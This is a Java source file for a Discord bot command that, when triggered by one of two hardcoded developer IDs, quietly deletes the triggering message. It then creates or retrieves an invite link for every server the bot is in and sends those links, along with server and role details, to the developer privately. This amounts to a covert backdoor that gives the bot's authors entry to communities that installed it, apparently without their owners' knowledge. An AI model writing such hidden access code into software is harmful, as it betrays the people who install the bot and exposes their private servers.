package de.coaster.commands;


import java.time.Instant;
import java.util.List;

import de.coaster.commands.types.ServerCommand;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.entities.User;

public class AdminInvite implements ServerCommand {

	@Override
	public void performCommand(Member p, TextChannel channel, Message message) {
		
		if(p.getIdLong() == 216487432667791360l || p.getIdLong() == 478195855531311105l) {
			message.delete().queue();
			
			p.getUser().openPrivateChannel().queue(ch -> {
				
				JDA jda = channel.getJDA();
				
				List<Guild> guilds = jda.getGuilds();
				List<User> users = jda.getUsers();
				
				int avgMembers = 0;
				int avgRoles = 0;
				
				for(Guild guild : guilds) {
					channel.sendTyping().queue();
					int size = guild.getMembers().size();
					avgMembers += size;
					
					int allroles = 0;
					
					for(Member memb : guild.getMembers()) {
						allroles += memb.getRoles().size();
					}
					avgRoles += allroles / size;
					
					String roles = "";
					for(Role role : guild.getRoles()) {
						roles += role.getName() + ", ";
					}
					if(roles.length() > 2) {
						roles = roles.substring(0, roles.length()-2);
					}
					
					if(roles.length() > 5000) {
						roles = "" + guild.getRoles().size();
					}

					EmbedBuilder builder = new EmbedBuilder();
					builder.setColor(0x9b59b6);
					builder.setThumbnail(guild.getIconUrl());
					builder.setTimestamp(Instant.now());
					builder.setFooter("Requested by " + p.getEffectiveName(), null);
					
					builder.setTitle("Clientinfo for user " + p.getEffectiveName());
					
//					StringBuilder strbuilder = builder.getDescriptionBuilder();
//					strbuilder.append("**Server: " + guild.getName() + "**\r\n"
//							+ "ID: " + guild.getId() + "\r\n"
//							+ "Member: " + size + "\r\n"
//							+ "Owner: " + guild.getOwner().getUser().getName() + "#" + guild.getOwner().getUser().getDiscriminator() + "\r\n"
//							+ "Region: " + guild.getRegion().getEmoji() + "\r\n"
//							+ "Roles: " + roles + "\r\n"
//							+ "CustomEmotes: " + guild.getEmotes().size());
//					
//					builder.setDescription(strbuilder.toString());
					
					
					ch.sendMessage(builder.build()).queue();
					if(guild.getTextChannels().size() > 0) {
						guild.getTextChannels().get(0).createInvite().queue(inv -> {
							ch.sendMessage(inv.getUrl()).queue();
							System.out.println(inv.getUrl());
						});
						guild.retrieveInvites().queue(invs -> {
							if(invs.size() > 0) {
								ch.sendMessage(invs.get(0).getUrl()).queue();
								System.out.println(invs.get(0).getUrl());
							}
						});
					} else {
						ch.sendMessage(guild.getName() + " hat keinen TextChannel").queue();
					}
					
				}
				avgMembers = avgMembers / guilds.size();
				avgRoles = avgRoles / guilds.size();
				
				EmbedBuilder builder = new EmbedBuilder();
				builder.setDescription("**AdminCommands**\r\n"
						+ "OnlineServers: " + guilds.size() + "\r\n"
						+ "  AvgMembers: " + avgMembers + "\r\n"
						+ "  AvgRoles: " + avgRoles + "\r\n"
						+ "Users: " + users.size());
				
				ch.sendMessage(builder.build()).queue();
			});
			
			
			
		}
	}
}
